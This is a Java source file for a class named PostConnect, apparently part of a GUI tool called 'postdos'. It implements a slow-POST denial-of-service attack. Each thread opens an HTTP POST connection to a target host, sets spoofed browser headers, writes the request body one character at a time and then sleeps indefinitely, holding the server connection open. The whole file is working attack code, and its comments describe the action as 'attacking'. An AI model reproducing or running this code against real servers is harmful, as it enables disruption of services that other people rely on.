/**
 * 
 */
package vn.kist.postdos;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.util.Random;

/**
 * @author Kobe
 *
 */
public class PostConnect implements Runnable{
	
	private static String host, param;
	private URL url;
	private HttpURLConnection con;
	private DataOutputStream wr;
	private StringBuilder paramBuild;
	private Random ran;
	
	
	public PostConnect() throws Exception{

	}
	
	/**
	 * Start attacking.
	 * 
	 * @throws Exception
	 */
	public void start() throws Exception {
		setHeaders();
		sendRequests();
	}
	
	/**
	 * Create a Http connection to target host.
	 * 
	 * @throws Exception
	 */
	public void createConnection(){
		try {
			con = (HttpURLConnection) url.openConnection();
		} catch (IOException e) {
			PostGui.setConsoleLog("[-] Exception: " + e + "\r\n");
		}
	}
	
	/**
	 * Set the request method and headers.
	 * Method: POST
	 * User Agent: Mozilla/5.0
	 * Accept Language: en-US, en;q=0.5
	 * 
	 */
	public void setHeaders() {
		
		try {
			getCon().setRequestMethod("POST");
		} catch (ProtocolException e) {
			PostGui.setConsoleLog("[-] Exception: " + e + "\r\n");
		}
		getCon().setRequestProperty("User-Agent", "Mozilla/5.0");
		getCon().setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		getCon().setDoOutput(true);
		
		if(PostGui.isRandom()) {
			setParam(genParam());
		} else {
			setParam(PostGui.getCusParam().getText());
		}
		
	}
	
	/**
	 * Send the request to target host. The payload will be
	 * sent one byte at a time, with a sleep interval of MAX_LONG.
	 */
	public void sendRequests() {
		
		try {
			wr = new DataOutputStream(getCon().getOutputStream());
		
			PostGui.setConsoleLog("[+] #" + Thread.currentThread().getName() + " sending...\r\n");
			for (int foo = 0; foo < param.length(); foo++) {
				wr.writeChar(param.charAt(foo));
				Thread.sleep(Long.MAX_VALUE);
			}
		} catch (Exception e) {
			PostGui.setConsoleLog("[-] Exception: " + e +"\r\n");
		}
	}
	
	/**
	 * Randomly generate a POST parameter with the following pattern:
	 * abcdef : acbdef
	 * 
	 * @return the randomly generated parameter.
	 */
	public String genParam() {
		
		paramBuild = new StringBuilder();
		
		paramBuild.delete(0, paramBuild.length());
		
		ran = new Random();
		
		for (int count_1 = 0; count_1 < 2; count_1++) {
			for(int count_2 = 0; count_2 < 10; count_2++) {
				paramBuild.append(ran.nextInt());
				
				if (count_2 == 5)
					paramBuild.append(":");
			}
			
			paramBuild.append("&");
		}
		
		return paramBuild.toString();
	}
	
	/**
	 * Close all open connections.
	 */
	public void closeConnection() {
		getCon().disconnect();
	}

	/**
	 * Get the connection object.
	 * 
	 * @return the connection object.
	 */
	public HttpURLConnection getCon() {
		return this.con;
	}
	
	/**
	 * Get the URL of the target host.
	 * 
	 * @return URL of the target host.
	 */
	public URL getUrl() {
		return url;
	}

	/**
	 * Set the URL of the target host.
	 * 
	 * @param url the URL of the target host.
	 */
	public void setUrl(URL url) {
		this.url = url;
	}

	/**
	 * Get the hostname.
	 * 
	 * @return host the hostname.
	 */
	public static String getHost() {
		return host;
	}

	/**
	 * Set the hostname.
	 * 
	 * @param host the host to set
	 */
	public static void setHost(String host) {
		PostConnect.host = host;
	}

	/**
	 * Get the data output stream.
	 * 
	 * @return the output stream
	 */
	public DataOutputStream getWr() {
		return wr;
	}

	/**
	 * Set the data output stream.
	 * 
	 * @param wr the output stream to set
	 */
	public void setWr(DataOutputStream wr) {
		this.wr = wr;
	}

	/**
	 * Get the POST parameter.
	 * 
	 * @return the parameter.
	 */
	public static String getParam() {
		return param;
	}

	/**
	 * Set the POST parameter.
	 * 
	 * @param param the parameter to set.
	 */
	public static void setParam(String param) {
		PostConnect.param = param;
	}

	@Override
	public void run() {
		try {
			start();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}

}
